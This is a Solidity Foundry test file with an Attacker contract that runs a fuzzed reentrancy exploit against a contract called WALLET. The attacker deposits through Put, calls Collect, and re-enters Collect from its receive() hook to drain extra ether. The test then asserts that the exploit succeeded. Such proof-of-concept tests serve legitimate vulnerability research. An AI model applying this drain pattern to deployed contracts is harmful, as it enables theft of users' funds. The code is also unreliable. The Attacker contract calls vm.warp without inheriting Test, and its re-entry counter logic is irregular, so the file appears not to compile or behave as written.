
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET} from "../src/WALLET.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyWALLET is Test {
    WALLET public _contractUnderTest;
    Log public _log;
    
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new WALLET(address(_log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 4);
        
        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public initialAttackerBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.Put{value: val}(block.timestamp + 1);
        vm.warp(block.timestamp + 2);
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        initialAttackerBalance = address(this).balance;
        
        victim.Collect(val);
        
        uint256 finalVictimBalance = address(victim).balance;
        uint256 finalAttackerBalance = address(this).balance;
        
        if (attackCallCount >= 2 && finalAttackerBalance >= initialAttackerBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            if (attackCallCount == 2) {
                victim.Collect(storedAttackVal);
            }
        }
    }
}
